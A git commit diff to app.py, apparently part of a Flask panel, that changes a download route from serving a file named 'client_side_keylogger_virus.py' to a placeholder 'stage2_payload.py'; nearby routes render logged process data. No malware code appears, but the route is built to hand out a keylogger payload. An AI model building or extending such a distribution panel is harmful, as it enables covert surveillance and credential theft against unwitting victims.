b9ea62dddc3497b45372d70f028e1a423edb350c
Abhishek Sharma <68034448+anonymous300502@users.noreply.github.com>
2024-06-01 20:21:24 +0530

    Update app.py

--- app.py
+++ app.py
@@ -53,7 +53,7 @@ def funk6():
          return render_template("log.html", data = data, processinfo = newlist1, lastupdated = prcsinfo[2])
 @app.route("/dwfile")
 def funkdw():
-    path = '/home/ubuntu/downloads/client_side_keylogger_virus.py'
+    path = 'Path to stage2_payload.py'
     return send_file(path, as_attachment=True)
 @app.route("/index", methods = ["GET"])
 @login_required
